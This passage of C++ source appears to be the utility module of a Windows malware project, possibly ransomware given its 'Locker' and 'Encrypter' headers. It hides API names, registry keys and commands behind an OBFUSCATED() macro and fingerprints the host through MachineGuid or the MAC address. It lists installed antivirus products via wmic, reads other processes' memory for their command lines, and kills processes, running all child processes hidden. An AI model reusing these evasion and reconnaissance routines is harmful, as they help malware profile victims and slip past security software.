#define _WIN32_DCOM
#include "Utils.h"
#include <stdio.h>
#include <ImageHlp.h>
#include <winnt.h>
#include <iphlpapi.h>
#include "Encrypter.h"
#include "Request.h"
#include "chrono"
#include <fstream>
#include <thread>
#include "Locker.h"
#include "shlobj.h"
#include <taskschd.h>
#include <comdef.h>
#include "ZipExt.h"
#include <random>
#include <sstream>
#include <winternl.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#include <regex>
namespace fs = std::filesystem;
#define DF_DosMagic OBFUSCATED("MZ")
#define DF_PEMagic OBFUSCATED("PE\0\0")

// offset of IMAGE_DOS_HEADER.e_lfanew
#define DF_NewHeaderOffset 0x3C

// 4("PE00") + 20(sizeof(IMAGE_FILE_HEADER))
// + offset of IMAGE_OPTIONAL_HEADER.Subsystem
#define DF_SubsytemOffset 0x5C

using std::string;
using std::vector;

// static time_t lastUpdateCheck = 0;
typedef struct
{
    FILETIME ftCTime; // ctime
    FILETIME ftATime; // atime
    FILETIME ftMTime; // mtime
} FileTimeSet;
HANDLE thisModule = NULL;
std::string _machineID = "";
// ExtractArchiveFunc ExtractArchiveProc = NULL;
// ExtractArchiveFunc VerifyArchiveExtractedProc = NULL;

BOOL IsWow64(HANDLE process);
std::string GetDllListerPath();
std::vector<std::string> ExecuteDllLister(int processId);
bool VerifyExtractedZip(std::string src, std::string dest, bool exportMissing = true);

// HANDLE GetDLLHandle()
// {
//     return thisModule == NULL ? GetModuleHandle(NULL) : thisModule;
// }
// BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
// {
//     switch (ul_reason_for_call)
//     {
//     case DLL_PROCESS_ATTACH:
//         std::cout << "DLL main\n";
//         thisModule = hModule;
//         break;
//     case DLL_PROCESS_DETACH:
//         break;
//     case DLL_THREAD_ATTACH:
//         break;
//     case DLL_THREAD_DETACH:
//         break;
//     }
//     return TRUE;
// }
static DWORD minimum(DWORD one, DWORD two)
{
    return one > two ? two : one;
}
bool IsCurrentProcessDll()
{
    char path[1024];
    memset(path, 0, sizeof(path));
    DWORD size = sizeof(path);
    auto module = GetCurrentModule();
    size = GetModuleFileNameA(module, path, size);
    std::string exe = path;
    auto info = GetPEInfo(exe);
    return info.isDll;
}
// void initializeZipLib()
// {
//     char tempBuffer[1024] = {0};
//     GetTempPathA(sizeof(tempBuffer), tempBuffer);
//     std::string tempDir = tempBuffer;

//     auto name = (RemoveExt(fs::path(GetExecutable()).filename().string()));
//     name = Encrypter::Encrypt(name);

//     auto dest = (fs::path(tempDir) /= name).string();

//     auto target = (fs::path(dest) /= (std::string("zutil") + (IsCurrentProcessX86() ? "86" : "64")) + ".dll").string();
//     if (!Exists(dest))
//     {
//         fs::create_directories(dest);
//     }
//     auto asset = GetEmbeddedAsset(25);
//     if (!Exists(target) || GetFileSize(target) != asset.size())
//     {
//         writeFile(target, &asset[0], asset.size());
//     }
//     asset = std::vector<uint8_t>();
//     HMODULE lib = LoadLibraryA(target.c_str());
//     if (lib != NULL)
//     {
//         ExtractArchiveProc = (ExtractArchiveFunc)GetProcAddress(lib, OBFUSCATED("ExtractArchive"));
//         VerifyArchiveExtractedProc = (ExtractArchiveFunc)GetProcAddress(lib, OBFUSCATED("VerifyExtracted"));
//     }
// }

typedef NTSTATUS(__stdcall *NtQueryInformationProcessFunc)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
NtQueryInformationProcessFunc NtQueryInformationProcessProc = nullptr;
std::string GetProcessCommandLine(int pid)
{
    std::string res;
    if (NtQueryInformationProcessProc == nullptr)
    {
        auto lib = LoadLibraryA("Ntdll.dll");
        if (lib != NULL)
        {
            NtQueryInformationProcessProc = (NtQueryInformationProcessFunc)GetProcAddress(lib, OBFUSCATED("NtQueryInformationProcess"));
        }
    }
    if (NtQueryInformationProcessProc != NULL)
    {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                                          PROCESS_VM_READ,
                                      FALSE, pid);
        if (NULL != hProcess)
        {

            auto pinfo = PROCESS_BASIC_INFORMATION{0};
            LONG status = NtQueryInformationProcessProc(hProcess,
                                                        PROCESSINFOCLASS ::ProcessBasicInformation,
                                                        &pinfo,
                                                        sizeof(PVOID) * 6,
                                                        NULL);
            PPEB ppeb = (PPEB)((PVOID *)&pinfo)[1];
            PPEB ppebCopy = (PPEB)malloc(sizeof(PEB));
            BOOL result = ReadProcessMemory(hProcess,
                                            ppeb,
                                            ppebCopy,
                                            sizeof(PEB),
                                            NULL);

            PRTL_USER_PROCESS_PARAMETERS pRtlProcParam = ppebCopy->ProcessParameters;
            PRTL_USER_PROCESS_PARAMETERS pRtlProcParamCopy =
                (PRTL_USER_PROCESS_PARAMETERS)malloc(sizeof(RTL_USER_PROCESS_PARAMETERS));
            result = ReadProcessMemory(hProcess,
                                       pRtlProcParam,
                                       pRtlProcParamCopy,
                                       sizeof(RTL_USER_PROCESS_PARAMETERS),
                                       NULL);
            PWSTR wBuffer = pRtlProcParamCopy->CommandLine.Buffer;
            USHORT len = pRtlProcParamCopy->CommandLine.Length;
            PWSTR wBufferCopy = (PWSTR)malloc(len);
            result = ReadProcessMemory(hProcess,
                                       wBuffer,
                                       wBufferCopy, // command line goes here
                                       len,
                                       NULL);
            std::wstring cmd = wBufferCopy;
            res = std::string(cmd.begin(), cmd.end());
            free(pRtlProcParamCopy);
            free(wBufferCopy);
        }
    }
    return res;
}
ExecResult StartProcess(std::string file, std::string cmd, int timeoutInSecs, bool *shouldExit)
{
    ExecResult result{0};
    result.exitcode = 1;
    string strResult;
    stringstream ss;
    HANDLE hPipeRead, hPipeWrite;

    SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES)};
    saAttr.bInheritHandle = TRUE; // Pipe handles are inherited by child process.
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe to get results from child's stdout.
    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
    {
        return result;
    }
    cmd = "\"" + file + "\" " + cmd;
    STARTUPINFOA si = {sizeof(STARTUPINFOW)};
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;
    si.wShowWindow = SW_HIDE; // Prevents cmd window from flashing.
    // Requires STARTF_USESHOWWINDOW in dwFlags.

    PROCESS_INFORMATION pi = {0};

    BOOL fSuccess = CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!fSuccess)
    {
        CloseHandle(hPipeWrite);
        CloseHandle(hPipeRead);
        return result;
    }

    bool bProcessEnded = false;
    auto start = std::time(NULL);
    auto now = start;
    for (; !bProcessEnded;)
    {
        // Give some timeslice (50 ms), so we won't waste 100% CPU.
        bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;
        if (timeoutInSecs > 0)
        {
            now = std::time(NULL);
            if ((now - timeoutInSecs) > start)
            {
                TerminateProcess(pi.hProcess, 0);
            }
        }
        if ((shouldExit != nullptr && *shouldExit))
        {
            TerminateProcess(pi.hProcess, 0);
        }
        // Even if process exited - we continue reading, if
        // there is some data available over pipe.
        for (;;)
        {
            char buf[1024];
            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
                break;

            if (!dwAvail) // No data available, return
                break;

            if (!::ReadFile(hPipeRead, buf, ::minimum(sizeof(buf) - 1, (DWORD)dwAvail), &dwRead, NULL) || !dwRead)
                // Error, the child process might ended
                break;

            buf[dwRead] = 0;
            ss << buf;
        }
    } // for
    strResult = ss.str();
    CloseHandle(hPipeWrite);
    CloseHandle(hPipeRead);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    result.exitcode = code;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    result.result = strResult;
    return result;
}
std::time_t ParseGitTime(std::string timeString)
{
    auto s = timeString;
    auto pos = s.find_last_of("+-Z");
    if (pos != s.npos)
    {
        s.resize(pos);
    }
    struct std::tm tm;
    std::istringstream ss(s);
    ss >> std::get_time(&tm, "%Y-%m-%dT%H:%M:%S"); // or just %T in this case
    std::time_t time = mktime(&tm);

    return time;
}

std::time_t to_time_t_type(std::filesystem::file_time_type tp)
{
    using namespace std::chrono;
    auto sctp = time_point_cast<system_clock::duration>(tp - std::filesystem::file_time_type::clock::now() + system_clock::now());
    return system_clock::to_time_t(sctp);
}
bool IsValidModule(void *buffer, uint64_t size)
{
    if (size == 0)
        return false;
    if (size < sizeof(IMAGE_NT_HEADERS32) + sizeof(IMAGE_DOS_HEADER))
    {
        return false;
    }
    auto pDosHeader = (IMAGE_DOS_HEADER *)buffer;

    if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
    {

        if (pDosHeader->e_lfanew)
        {
            IMAGE_NT_HEADERS32 *pNtHeader = (IMAGE_NT_HEADERS32 *)((PBYTE)pDosHeader + pDosHeader->e_lfanew);

            if (pNtHeader->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI || pNtHeader->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_GUI)
            {

                return true;
            }
        }
    }
    return false;
}
bool IsValidModule(vector<uint8_t> &buffer)
{
    if (buffer.size() == 0)
        return false;
    return IsValidModule(&buffer[0], buffer.size());
}
bool ProcessIsRunning(std::string file)
{
    auto procs = GetProcs();
    for (auto &proc : procs)
    {
        if (proc.FullPath == file)
        {
            return true;
        }
    }
    return false;
}
BOOL IsWow64(HANDLE process)
{
    BOOL bIsWow64 = FALSE;

    typedef BOOL(WINAPI * LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process;
    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), OBFUSCATED("IsWow64Process"));

    if (NULL != fnIsWow64Process)
    {
        if (!fnIsWow64Process(process, &bIsWow64))
        {
            char path[1024];
            DWORD count = 0;
            if (QueryFullProcessImageNameA(process, 0, path, &count))
            {
                IsX86(path);
            }
        }
    }
    return bIsWow64;
}
bool IsSystemX86()
{
    SYSTEM_INFO systemInfo = {0};
    GetNativeSystemInfo(&systemInfo);

    // x86 environment
    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
        return true;

    return false;
}
bool IsX86FromBuffer(std::vector<uint8_t> &buffer)
{
    return IsX86FromBuffer(&buffer[0], buffer.size());
}
bool IsX86FromBuffer(void *buffer, uint64_t size)
{

    if (size < sizeof(IMAGE_NT_HEADERS32) + sizeof(IMAGE_DOS_HEADER))
    {
        return false;
    }
    auto pDosHeader = (IMAGE_DOS_HEADER *)buffer;

    if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
    {

        if (pDosHeader->e_lfanew)
        {
            IMAGE_NT_HEADERS32 *pNtHeader = (IMAGE_NT_HEADERS32 *)((PBYTE)pDosHeader + pDosHeader->e_lfanew);

            if (pNtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
            {
                return true;
            }
            if (pNtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
            {
                return false;
            }
        }
    }

    return false;
}
bool Exists(std::string path)
{
    try
    {
        return fs::exists(path);
    }
    catch (...)
    {
    }

    return false;
}
bool IsSystemX64()
{
    SYSTEM_INFO systemInfo = {0};
    GetNativeSystemInfo(&systemInfo);

    // x86 environment
    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        return true;

    return false;
}
std::string GetMachineID()
{
    if (_machineID.size() > 0)
        return _machineID;
    std::string id;

    std::string regKeyString = OBFUSCATED("SOFTWARE\\Microsoft\\Cryptography");
    std::string regValueString = OBFUSCATED("MachineGuid");

    std::string valueFromRegistry;
    try
    {
        valueFromRegistry = GetStringValueFromHKLM(regKeyString, regValueString);
        id = valueFromRegistry;
    }
    catch (std::exception &e)
    {
        std::cerr << e.what();
    }

    if (id.size() == 0)
    {
        id = GetMac();
    }
    id = base64::Base64::Encode(id);
    id += IsUserInteractive() ? "_user" : "_system";
    _machineID = id;
    return id;
}
std::wstring ToWide(std::string datastring)
{
    std::wstring wd(datastring.begin(), datastring.end());
    return wd;
}
std::string ToUnicode(std::wstring datastring)
{
    std::string un(datastring.begin(), datastring.end());
    return un;
}
std::string GetTempFileOrDirName(bool isDirectory, std::string suffix)
{

    std::stringstream ss;
    ss << GetRandom() << GetRandom();
    std::string dir = (fs::temp_directory_path() / ss.str()).string();
    try
    {
        while (Exists(dir))
        {
            std::stringstream ss2;
            ss2 << GetRandom();
            dir = (fs::temp_directory_path() / ss2.str()).string();
        }
        if (suffix != "" && !isDirectory)
        {
            dir.append(".");
            dir.append(suffix);
        }
    }
    catch (std::exception &ex)
    {
        dir = (fs::temp_directory_path() / std::to_string(GetRandom())).string();
    }
    return dir;
}

HMODULE GetCurrentModule()
{
    HMODULE hModule = nullptr;
    GetModuleHandleEx(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        reinterpret_cast<LPCTSTR>(GetCurrentModule),
        &hModule);

    return hModule;
}

PEINFO GetPEInfo(void *buffer, size_t size)
{
    PEINFO info;
    info.isValid = false;
    if (size > 10 && buffer != NULL)
    {
        auto pDosHeader = (IMAGE_DOS_HEADER *)buffer;

        if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
        {
            auto pDosExeStart = (PBYTE)pDosHeader + pDosHeader->e_cparhdr * 16;

            // if (g_bDump)
            //     HexDump(1, pDosExeStart, pDosHeader->e_lfanew - pDosHeader->e_cparhdr * 16, (DWORD)pDosExeStart);

            if (pDosHeader->e_lfanew)

            {
                auto pNtHeader = (IMAGE_NT_HEADERS32 *)((PBYTE)pDosHeader + pDosHeader->e_lfanew);

                if (pNtHeader)
                {

                    info.isValid = true;
                    info.isx86 = !(pNtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 && pNtHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);
                    info.isDll = pNtHeader->FileHeader.Characteristics & IMAGE_FILE_DLL;
                    info.timestamp = (long)pNtHeader->FileHeader.TimeDateStamp;
                    info.isConsole = pNtHeader->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI;
                    if (!info.isx86)
                    {
                        _IMAGE_NT_HEADERS64 *pNtHeader2 = (_IMAGE_NT_HEADERS64 *)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
                        auto dotnetDir = pNtHeader2->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
                        info.isDotNet = dotnetDir.Size != 0 && dotnetDir.VirtualAddress != 0;
                    }
                    else
                    {
                        auto dotnetDir = pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
                        info.isDotNet = dotnetDir.Size != 0 && dotnetDir.VirtualAddress != 0;
                    }

                    info.fileSize = size;
                    info.peSize = pNtHeader->OptionalHeader.SizeOfHeaders;
                    PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(pNtHeader);
                    for (WORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)
                    {
                        info.peSize += Section->SizeOfRawData;
                        Section++;
                    }
                }
            }
        }
    }
    return info;
}
void KillProcessByName(string process)
{
    try
    {
        auto name = fs::path(process).filename().string();
        stringstream s;
        s << OBFUSCATED("/IM ") << name << " /F";
        std::string cmd = s.str();
        auto res = StartProcess(OBFUSCATED("taskkill"), cmd);
    }
    catch (const std::exception &e)
    {
        std::cerr << e.what() << '\n';
    }
}
void KillProcessByPID(int pid)
{

    stringstream s;
    s << OBFUSCATED("/PID ") << pid << " /F";
    std::string cmd = s.str();
    auto res = StartProcess(OBFUSCATED("taskkill"), cmd);
}

void KillAllFromDirectory(string dir)
{
    auto procs = GetProcs();

    for (auto proc : procs)
    {

        if (proc.FullPath.length() > 0 && StringUtils::startsWith(proc.FullPath, dir))
        {
            KillProcessByPID(proc.Pid);
        }
    }
}
bool ExtractArchive(std::string src, std::string dest)
{
    return zipext::ExtractToFolder(src, dest);
    // return ExtractArchiveProc(src.c_str(), dest.c_str());
}

bool VerifyExtractedZip(std::string src, std::string dest, bool exportMissing)
{
    bool success = true;
    auto entries = zipext::GetZipEntries(src);
    for (auto &entry : entries)
    {
        if (!entry.isDir)
        {
            auto target = (fs::path(dest) /= entry.Name).string();
            if (Exists(target) && GetFileSize(target) == entry.uncompressedSize)
            {
                continue;
            }
            else
            {
                if (exportMissing)
                {
                    success = success && zipext::ExtractEntryToFile(src, target, entry.Name);
                }
                else
                {
                    return false;
                }
            }
        }
    }
    if (exportMissing && !success)
    {
        return VerifyExtractedZip(src, dest, false);
    }
    return success;
}
bool VerifyArchiveExtracted(std::string src, std::string dest)
{
    return VerifyExtractedZip(src, dest, true);
}
PEINFO GetPEInfo(std::string exe)
{
    AutoReleaseModuleBuffer buffer(exe.c_str());
    return GetPEInfo((LPVOID)buffer, buffer.size);
}

std::string HashString(std::string &str)
{
    std::string result;
    SHA256 sha;
    sha.update(str);
    uint8_t *digest = sha.digest();

    result = SHA256::toString(digest);

    delete[] digest;
    return result;
}

std::string GetStringValueFromHKLM(const std::string &regSubKey, const std::string &regValue)
{
    size_t bufferSize = 4096; // If too small, will be resized down below.
    std::string valueBuf;     // Contiguous buffer since C++11.
    valueBuf.resize(bufferSize);
    auto cbData = static_cast<DWORD>(bufferSize * sizeof(char));

    HMODULE mod = LoadLibrary(OBFUSCATED("Advapi32"));
    // typedef void (*C2ustomFreeLibraryFunc)(HCUSTOMMODULE, void *);
    typedef LSTATUS(__stdcall * ProcRegGetValueA)(HKEY hkey, LPCSTR lpSubKey, LPCSTR lpValue, DWORD dwFlags, LPDWORD pdwType, PVOID pvData, LPDWORD pcbData);

    auto RegGetValueAProc = (ProcRegGetValueA)GetProcAddress(mod, OBFUSCATED("RegGetValueA"));

    auto rc = RegGetValueAProc(
        HKEY_LOCAL_MACHINE,
        regSubKey.c_str(),
        regValue.c_str(),
        RRF_RT_REG_SZ,
        nullptr,
        (void *)&valueBuf[0],
        &cbData);
    while (rc == ERROR_MORE_DATA)
    {
        // Get a buffer that is big enough.
        // cbData /= sizeof(wchar_t);
        if (cbData > static_cast<DWORD>(bufferSize))
        {
            bufferSize = static_cast<size_t>(cbData);
        }
        else
        {
            bufferSize *= 2;
            cbData = static_cast<DWORD>(bufferSize);
        }
        valueBuf.resize(bufferSize);
        rc = RegGetValueAProc(
            HKEY_LOCAL_MACHINE,
            regSubKey.c_str(),
            regValue.c_str(),
            RRF_RT_REG_SZ,
            nullptr,
            (void *)&valueBuf[0],
            &cbData);
    }
    if (rc == ERROR_SUCCESS)
    {
        valueBuf.resize(static_cast<size_t>(cbData - 1)); // remove end null character
        return valueBuf;
    }
    else
    {
        throw std::runtime_error(OBFUSCATED("Windows system error code: ") + std::to_string(rc));
    }
}
std::string GetMac()
{
    string result = "";
    IP_ADAPTER_INFO AdapterInfo[32];
    DWORD dwBufLen = sizeof(AdapterInfo);

    HMODULE mod = LoadLibrary(OBFUSCATED("Iphlpapi"));
    // typedef void (*C2ustomFreeLibraryFunc)(HCUSTOMMODULE, void *);
    typedef ULONG(__stdcall * ProcGetAdaptersInfo)(PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer);

    auto GetAdaptersInfoProc = (ProcGetAdaptersInfo)GetProcAddress(mod, OBFUSCATED("GetAdaptersInfo"));
    DWORD dwStatus = GetAdaptersInfoProc(AdapterInfo, &dwBufLen);
    if (dwStatus == ERROR_SUCCESS)
    {
        char buff[4];
        for (int i = 0; i < AdapterInfo->AddressLength; i++)
        {
            WORD character = (WORD)AdapterInfo->Address[i];
            itoa((WORD)character, buff, 16);
            if (strlen(buff) == 1)
            {
                buff[2] = 0;
                buff[1] = buff[0];
                buff[0] = '0';
            }

            for (int x = 0; x < strlen(buff); x++)
                buff[x] = toupper(buff[x]);

            result.append(buff);
            // if (i < (AdapterInfo->AddressLength - 1))
            //     result.append("-");
        }
    }

    return result;
}
std::vector<uint8_t> ReadFile(const char *filename, bool *success)
{
    std::vector<uint8_t> buffer;
    FILE *fileptr;
    std::string file = filename;
    if (file.size() > MAX_PATH && !StringUtils::startsWith(file, R"(\??\)"))
    {
        file = R"(\??\)" + file;
    }
    fileptr = fopen(file.c_str(), "rb"); // Open the file in binary mode
    if (fileptr)
    {
        fseek(fileptr, 0, SEEK_END);           // Jump to the end of the file
        auto filelen = (size_t)ftell(fileptr); // Get the current byte offset in the file
        rewind(fileptr);

        buffer.resize(filelen);

        // buffer = (BYTE *)malloc((filelen + 1) * sizeof(char)); // Enough memory for file + \0
        auto written = fread(&buffer.data()[0], sizeof(char), filelen, fileptr); // Read in the entire file
        if (written == filelen)
        {
            if (success != nullptr)
            {
                *success = true;
            }
        }
        else
        {
            if (success != nullptr)
            {
                *success = false;
            }
            buffer.clear();
        }
        fclose(fileptr); // Close the file
    }
    else
    {
        if (success != nullptr)
        {
            *success = false;
        }
    }
    return buffer;
}
bool IsX64(const char *file)
{
    return !GetPEInfo(file).isx86;
}
bool IsX86(const char *file)
{
    return GetPEInfo(file).isx86;
}
std::string GetUsersHome()
{
    static std::string home;
    if (home.size() > 0)
    {
        return home;
    }
    std::string homeTemp = getenv("USERPROFILE");
    if (Exists((fs::path("C:\\Users") /= (fs::path(homeTemp).filename().string())).string()))
    {
        home = homeTemp;
        return home;
    }
    for (auto &path : fs::directory_iterator("C:\\Users"))
    {
        if (path.is_directory())
        {
            if (Exists((path.path().string() + "\\AppData")))
            {
                home = path.path().string();
            }
        }
    }
    return home;
}
BOOL IsService()
{
    void *buf = NULL;
    DWORD bufSize = 0;
    DWORD moreBytesNeeded, serviceCount;
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == hSCM)
    {
        return FALSE;
    }

    for (;;)
    {
        // printf("Calling EnumServiceStatusEx with bufferSize %d\n", bufSize);
        if (EnumServicesStatusEx(
                hSCM,
                SC_ENUM_PROCESS_INFO,
                SERVICE_WIN32,
                SERVICE_STATE_ALL,
                (LPBYTE)buf,
                bufSize,
                &moreBytesNeeded,
                &serviceCount,
                NULL,
                NULL))
        {
            ENUM_SERVICE_STATUS_PROCESS *services = (ENUM_SERVICE_STATUS_PROCESS *)buf;
            BOOL isSvc = FALSE;
            DWORD id = GetCurrentProcessId();
            for (DWORD i = 0; i < serviceCount; ++i)
            {

                if (services[i].ServiceStatusProcess.dwProcessId == id)
                {
                    isSvc = TRUE;
                    break;
                }
            }
            free(buf);
            CloseServiceHandle(hSCM);
            return isSvc;
        }
        int err = GetLastError();
        if (ERROR_MORE_DATA != err)
        {
            free(buf);
            CloseServiceHandle(hSCM);
            return FALSE;
        }
        bufSize += moreBytesNeeded;
        free(buf);
        buf = malloc(bufSize);
    }
}

std::string GetExecutable()
{
    char path[1024];

    memset(path, 0, sizeof(path));
    DWORD size = sizeof(path);
    auto module = GetModuleHandleA(NULL);
    size = GetModuleFileNameA(module, path, size);
    std::string exe = path;

    return exe;
}

BOOL IsUserInteractive()
{
    BOOL bIsUserInteractive = TRUE;

    HWINSTA hWinStation = GetProcessWindowStation();
    if (hWinStation != NULL)
    {
        USEROBJECTFLAGS uof = {0};
        if (GetUserObjectInformation(hWinStation, UOI_FLAGS, &uof, sizeof(USEROBJECTFLAGS), NULL) && ((uof.dwFlags & WSF_VISIBLE) == 0))
        {
            bIsUserInteractive = FALSE;
        }
    }
    return bIsUserInteractive;
}
bool IsX86Process(HANDLE process)
{
    SYSTEM_INFO systemInfo = {0};
    GetNativeSystemInfo(&systemInfo);

    // x86 environment
    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
        return true;

    // Check if the process is an x86 process that is running on x64 environment.
    // IsWow64 returns true if the process is an x86 process
    return IsWow64(process);
}
bool IsX86ProcessFromPID(int pid)
{
    auto result = false;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                                      PROCESS_VM_READ,
                                  FALSE, pid);
    if (NULL != hProcess)
    {
        result = IsX86Process(hProcess);
        CloseHandle(hProcess);
    }
    return result;
}
bool IsCurrentProcessX86()
{
    auto proc = GetCurrentProcess();
    bool x86 = IsX86Process(proc);
    return x86;
}
int getppid(int pid)
{
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD ppid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE)
        return ppid;

    ZeroMemory(&pe32, sizeof(pe32));
    pe32.dwSize = sizeof(pe32);
    if (!Process32First(hSnapshot, &pe32))
        return ppid;

    do
    {
        if (pe32.th32ProcessID == pid)
        {
            ppid = pe32.th32ParentProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));
    CloseHandle(hSnapshot);
    return ppid;
}

// std::vector<ScheduledTask> ListTasks()
// {
//     std::vector<ScheduledTask> tasks;
//     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
//     if (FAILED(hr))
//     {
//         printf("\nCoInitializeEx failed: %x", hr);
//         return tasks;
//     }

//     //  Set general COM security levels.
//     hr = CoInitializeSecurity(
//         NULL,
//         -1,
//         NULL,
//         NULL,
//         RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
//         RPC_C_IMP_LEVEL_IMPERSONATE,
//         NULL,
//         0,
//         NULL);

//     if (FAILED(hr))
//     {
//         printf("\nCoInitializeSecurity failed: %x", hr);
//         CoUninitialize();
//         return tasks;
//     }

//     //  ------------------------------------------------------
//     //  Create an instance of the Task Service.
//     ITaskService *pService = NULL;
//     hr = CoCreateInstance(CLSID_TaskScheduler,
//                           NULL,
//                           CLSCTX_INPROC_SERVER,
//                           IID_ITaskService,
//                           (void **)&pService);
//     if (FAILED(hr))
//     {
//         printf("Failed to CoCreate an instance of the TaskService class: %x", hr);
//         CoUninitialize();
//         return tasks;
//     }

//     //  Connect to the task service.
//     hr = pService->Connect(_variant_t(), _variant_t(),
//                            _variant_t(), _variant_t());
//     if (FAILED(hr))
//     {
//         printf("ITaskService::Connect failed: %x", hr);
//         pService->Release();
//         CoUninitialize();
//         return tasks;
//     }

//     //  ------------------------------------------------------
//     //  Get the pointer to the root task folder.
//     ITaskFolder *pRootFolder = NULL;
//     hr = pService->GetFolder(BSTR(L"\\"), &pRootFolder);

//     pService->Release();
//     if (FAILED(hr))
//     {
//         printf("Cannot get Root Folder pointer: %x", hr);
//         CoUninitialize();
//         return tasks;
//     }

//     //  -------------------------------------------------------
//     //  Get the registered tasks in the folder.
//     IRegisteredTaskCollection *pTaskCollection = NULL;
//     hr = pRootFolder->GetTasks(NULL, &pTaskCollection);

//     pRootFolder->Release();
//     if (FAILED(hr))
//     {
//         printf("Cannot get the registered tasks.: %x", hr);
//         CoUninitialize();
//         return tasks;
//     }

//     LONG numTasks = 0;
//     hr = pTaskCollection->get_Count(&numTasks);

//     if (numTasks == 0)
//     {
//         printf("\nNo Tasks are currently running");
//         pTaskCollection->Release();
//         CoUninitialize();
//         return tasks;
//     }

//     printf("\nNumber of Tasks : %d", numTasks);

//     TASK_STATE taskState;

//     for (LONG i = 0; i < numTasks; i++)
//     {
//         ScheduledTask task;
//         IRegisteredTask *pRegisteredTask = NULL;
//         hr = pTaskCollection->get_Item(_variant_t(i + 1), &pRegisteredTask);
//         std::wstring wdStr;
//         if (SUCCEEDED(hr))
//         {
//             BSTR taskName = NULL;

//             hr = pRegisteredTask->get_Name(&taskName);
//             if (SUCCEEDED(hr))
//             {
//                 printf("\nTask Name: %S", taskName);
//                 SysFreeString(taskName);

//                 hr = pRegisteredTask->get_State(&taskState);
//                 if (SUCCEEDED(hr))
//                     printf("\n\tState: %d", taskState);
//                 else
//                     printf("\n\tCannot get the registered task state: %x", hr);
//                 task.state =  taskState;
//                 task.name = ToUnicode(taskName);
//             }
//             else
//             {
//                 printf("\nCannot get the registered task name: %x", hr);
//             }
//             BSTR path = NULL;
//             hr = pRegisteredTask->get_Path(&path);
//             if (SUCCEEDED(hr))
//             {
//                 task.path = ToUnicode(path);
//             }
//             VARIANT_BOOL* enabled=nullptr;
//             hr = pRegisteredTask->get_Enabled(enabled);
//             if (SUCCEEDED(hr))
//             {
//                 task.enabled =*enabled;
//             }
//             tasks.push_back(task);
//             pRegisteredTask->Release();
//         }
//         else
//         {
//             printf("\nCannot get the registered task item at index=%d: %x", i + 1, hr);
//         }
//     }

//     pTaskCollection->Release();
//     CoUninitialize();
//     return tasks;
// }
std::vector<std::string> GetAntivirusProducts()
{
    std::vector<std::string> products;
    std::string command = OBFUSCATED(R"(/Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get pathToSignedReportingExe /Format:csv)");
    auto res = StartProcess(OBFUSCATED("wmic.exe"), command);
    if (res.exitcode == 0)
    {
        res.result = StringUtils::trim(res.result);
        int idx = 0;
        for (auto &line : StringUtils::split(res.result, '\n'))
        {
            if (idx > 0)
            {
                auto split = StringUtils::split(StringUtils::trim(line), ',');
                if (split.size() == 2)
                {
                    char dest[1024];
                    ExpandEnvironmentStringsA(split[1].c_str(), dest, sizeof(dest));
                    // if(IsX86Process(GetCurrentProcess())){

                    // }
                    products.push_back(std::string(dest));
                }
            }
            idx++;
        }
    }
    return products;
}
bool isNumber(std::string &no)
{
    no = StringUtils::trim(no);
    return !no.empty() && std::find_if(no.begin(), no.end(), [](unsigned char c)
